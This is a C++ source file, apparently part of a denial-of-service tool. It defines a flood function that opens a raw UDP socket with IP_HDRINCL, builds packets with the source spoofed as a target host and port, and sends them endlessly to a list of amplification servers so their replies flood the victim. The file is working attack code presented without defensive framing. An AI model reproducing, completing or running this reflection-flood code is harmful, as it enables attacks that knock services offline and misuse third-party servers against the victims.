#include "flood.h"

static constexpr int MAX_PACKET_SIZE = 65535;

void flood(const std::list <ServeraAmplf> &serverAmplificatorList,
           const char *const targetHost,
           const uint16_t targetPort,
           const uint8_t *const packet,
           const size_t packetSz,
           const uint32_t sleep
) {
    // Create socket
    int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockfd < 0)
        throw std::runtime_error("raw-socket creation failed");

    // Set options
    int on = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
        throw std::runtime_error("cannot set IP_HDRINCL");

    // Buff for packet
    char dataBuff[MAX_PACKET_SIZE];
    insertDataPacket(dataBuff, packet, packetSz);

    while (true) {
        for (const auto &serverAmplificator: serverAmplificatorList) {

            // Build packet
            const unsigned long sendPackSz = buildSpoofPacket(dataBuff,
                                                              serverAmplificator,
                                                              targetHost,
                                                              targetPort,
                                                              packetSz);

            sockaddr_in peer{};

            peer.sin_family = AF_INET;
            peer.sin_addr.s_addr = inet_addr(serverAmplificator.host.c_str());
            peer.sin_port = htons(serverAmplificator.port);

            const long sendedBytes = sendto(sockfd, dataBuff, sendPackSz, 0, (sockaddr * ) & peer, sizeof(peer));

            if (sendedBytes != sendPackSz)
                std::cerr
                        << "Warning: sendBytes != total protocol packet size ("
                        << sendedBytes
                        << ", "
                        << sendPackSz
                        << ")"
                        << std::endl;

            usleep(sleep * 1000);
        }
    }

    close(sockfd);
}
